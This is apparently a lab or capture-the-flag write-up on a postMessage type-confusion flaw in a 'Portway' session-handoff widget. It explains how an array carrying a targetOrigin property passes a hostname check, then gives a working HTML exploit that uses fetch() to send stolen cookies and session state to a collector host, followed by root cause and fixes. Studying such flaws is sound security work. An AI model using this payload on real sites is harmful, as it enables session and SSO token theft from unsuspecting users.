# Portway postMessage targetOrigin Overload Confusion

## What Is Happening

The Portway lab at `/embed/handoff` accepts a message from a partner page and replies with session state via `postMessage`. The review flow opens an attacker-supplied partner URL in a fresh authenticated browser session.

This variant does not fall to classic userinfo parser confusion. Instead, it falls to a type/overload confusion bug: the widget validates `m.data.origin` with `new URL(origin)` and later reuses the same value as the second argument to `postMessage`.

## Why It Happens

The live widget logic was equivalent to:

```javascript
window.addEventListener("message", (m) => {
  const origin = m.data && m.data.origin;
  if (new URL(origin).hostname === "pwnbox.io") {
    const target = window.opener || window.parent;
    target.postMessage(document.cookie, origin);
  }
});
```

Two bugs combine:

1. The widget trusts `m.data.origin`, not the browser-supplied `m.origin`.
2. It accepts a non-string object that different APIs interpret differently.

Working value:

```javascript
const a = ["https://pwnbox.io"];
a.targetOrigin = "https://attacker.example";
```

Why this passes:

- `new URL(a)` coerces the array to `"https://pwnbox.io"`
- `.hostname` becomes `"pwnbox.io"`
- `postMessage(..., a)` can treat the same array as an options object and honor `a.targetOrigin`

So the validator sees a trusted hostname while the sink delivers to the attacker origin.

## Exact Test

Use an attacker-controlled HTTPS page that:

1. embeds `https://42336ae3fef8.pwnbox-lab.com/embed/handoff`
2. listens for the reply
3. sends a forged message whose `origin` value is an array carrying `targetOrigin`

Minimal payload shape:

```html
<script>
const f = document.createElement('iframe');
f.src = 'https://42336ae3fef8.pwnbox-lab.com/embed/handoff';
document.body.appendChild(f);

window.addEventListener('message', function(e) {
  fetch('https://[collector]?d=' + encodeURIComponent(
    'origin=' + e.origin + ' data=' + String(e.data)
  ));
});

setTimeout(function() {
  const a = ['https://pwnbox.io'];
  a.targetOrigin = location.origin;
  f.contentWindow.postMessage({ origin: a }, '*');
}, 1500);
</script>
```

Report that partner URL through `/report`.

## Expected Signal

- In a local embedded test, the widget may answer but return an empty cookie due to third-party cookie restrictions.
- In the reviewer-run flow, the same payload should receive a callback from the Portway origin containing sensitive session state.
- The collector should record a request showing a message from `https://42336ae3fef8.pwnbox-lab.com`.

## Result Interpretation

Confirmed bug chain:

```text
attacker-controlled partner page
-> embeds /embed/handoff
-> sends { origin: arrayLikeValue }
-> new URL(origin).hostname sees "pwnbox.io"
-> postMessage(..., origin) honors origin.targetOrigin
-> widget posts session state to attacker origin
```

The critical lesson is that validation and sink behavior must agree on type. A value that is merely "stringifiable" is not safe to reuse at an API boundary with overloads.

## Root Cause

The SDK trusts attacker-controlled message data as the partner identity and reuses a non-primitive value across two browser APIs with different coercion and overload behavior.

## Impact

- Leakage of reviewer session state or handoff token
- Full break of the session-handoff trust boundary
- In real integrations, likely SSO/session theft against partner workflows

## Fix

- Validate `m.origin`, never a self-declared origin field inside `m.data`
- Require `typeof origin === "string"` before parsing or reuse
- Parse once and reuse the normalized primitive string value
- Compare exact `origin`, not only hostname
- Send narrow signed handoff tokens rather than raw cookie/session material

## Key Lesson

When a browser API has overloads, "passes validation after coercion" does not mean "safe at the sink." Freeze the type before validation and never let attacker-controlled objects cross parser-to-sink boundaries.
